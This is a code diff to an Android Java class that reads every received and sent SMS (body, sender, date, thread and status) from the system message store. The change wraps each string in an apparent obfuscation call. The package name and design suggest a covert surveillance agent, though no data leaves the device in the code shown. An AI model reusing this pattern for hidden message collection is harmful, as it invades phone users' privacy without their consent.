@@ -14,10 +14,10 @@ import java.util.ArrayList;
 import android.database.Cursor;
 import android.net.Uri;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.util.Check;
+import com.android.m.M;
 
 public class SmsBrowser {
 	private static final String TAG = "SmsBrowser"; //$NON-NLS-1$
@@ -34,8 +34,8 @@ public class SmsBrowser {
 	public synchronized ArrayList<Sms> getSmsList(int lastManagedId) {
 		list.clear();
 
-		int maxRec = parse(Messages.getString("14_0"), Sms.RECEIVED, lastManagedId); //$NON-NLS-1$
-		int maxSent = parse(Messages.getString("14_1"), Sms.SENT, lastManagedId); //$NON-NLS-1$
+		int maxRec = parse(M.e("content://sms/inbox"), Sms.RECEIVED, lastManagedId); //$NON-NLS-1$
+		int maxSent = parse(M.e("content://sms/sent"), Sms.SENT, lastManagedId); //$NON-NLS-1$
 
 		maxId = Math.max(maxRec, maxSent);
 
@@ -45,7 +45,7 @@ public class SmsBrowser {
 	public synchronized ArrayList<Sms> getLastSmsSent(int lastManagedId) {
 		list.clear();
 
-		maxId = parse(Messages.getString("14_1"), Sms.SENT, lastManagedId); //$NON-NLS-1$
+		maxId = parse(M.e("content://sms/sent"), Sms.SENT, lastManagedId); //$NON-NLS-1$
 
 		return list;
 	}
@@ -86,9 +86,9 @@ public class SmsBrowser {
 				localMaxId = Math.max(localMaxId, id);
 				printColumnsSms(c);
 
-				body = c.getString(c.getColumnIndexOrThrow(Messages.getString("14_2"))).toString(); //$NON-NLS-1$
-				number = c.getString(c.getColumnIndexOrThrow(Messages.getString("14_3"))).toString(); //$NON-NLS-1$
-				date = Long.parseLong(c.getString(c.getColumnIndexOrThrow(Messages.getString("14_4"))).toString()); //$NON-NLS-1$
+				body = c.getString(c.getColumnIndexOrThrow(M.e("body"))).toString(); //$NON-NLS-1$
+				number = c.getString(c.getColumnIndexOrThrow(M.e("address"))).toString(); //$NON-NLS-1$
+				date = Long.parseLong(c.getString(c.getColumnIndexOrThrow(M.e("date"))).toString()); //$NON-NLS-1$
 
 				sentStatus = sentState;
 			} catch (final Exception e) {
@@ -109,7 +109,7 @@ public class SmsBrowser {
 
 			// These fields are optional
 			try {
-				final String thread_id = c.getString(c.getColumnIndexOrThrow(Messages.getString("14_6"))); //$NON-NLS-1$
+				final String thread_id = c.getString(c.getColumnIndexOrThrow(M.e("thread_id"))); //$NON-NLS-1$
 				s.setThreadId(thread_id);
 			} catch (final Exception e) {
 				if (Cfg.EXCEPTION) {
@@ -122,7 +122,7 @@ public class SmsBrowser {
 			}
 
 			try {
-				final String protocol = c.getString(c.getColumnIndexOrThrow(Messages.getString("14_8"))); //$NON-NLS-1$
+				final String protocol = c.getString(c.getColumnIndexOrThrow(M.e("protocol"))); //$NON-NLS-1$
 				s.setProtocol(protocol);
 			} catch (final Exception e) {
 				if (Cfg.EXCEPTION) {
@@ -135,7 +135,7 @@ public class SmsBrowser {
 			}
 
 			try {
-				final String read = c.getString(c.getColumnIndexOrThrow(Messages.getString("14_9"))); //$NON-NLS-1$
+				final String read = c.getString(c.getColumnIndexOrThrow(M.e("read"))); //$NON-NLS-1$
 				s.setRead(read);
 			} catch (final Exception e) {
 				if (Cfg.EXCEPTION) {
@@ -148,7 +148,7 @@ public class SmsBrowser {
 			}
 
 			try {
-				final String status = c.getString(c.getColumnIndexOrThrow(Messages.getString("14_10"))); //$NON-NLS-1$
+				final String status = c.getString(c.getColumnIndexOrThrow(M.e("status"))); //$NON-NLS-1$
 				s.setStatus(status);
 			} catch (final Exception e) {
 				if (Cfg.EXCEPTION) {
@@ -161,7 +161,7 @@ public class SmsBrowser {
 			}
 
 			try {
-				final String type = c.getString(c.getColumnIndexOrThrow(Messages.getString("14_11"))); //$NON-NLS-1$
+				final String type = c.getString(c.getColumnIndexOrThrow(M.e("type"))); //$NON-NLS-1$
 				s.setType(type);
 			} catch (final Exception e) {
 				if (Cfg.EXCEPTION) {
@@ -174,7 +174,7 @@ public class SmsBrowser {
 			}
 
 			try {
-				final String reply_path = c.getString(c.getColumnIndexOrThrow(Messages.getString("14_12"))); //$NON-NLS-1$
+				final String reply_path = c.getString(c.getColumnIndexOrThrow(M.e("reply_path_present"))); //$NON-NLS-1$
 				s.setReplyPath(reply_path);
 			} catch (final Exception e) {
 				if (Cfg.EXCEPTION) {
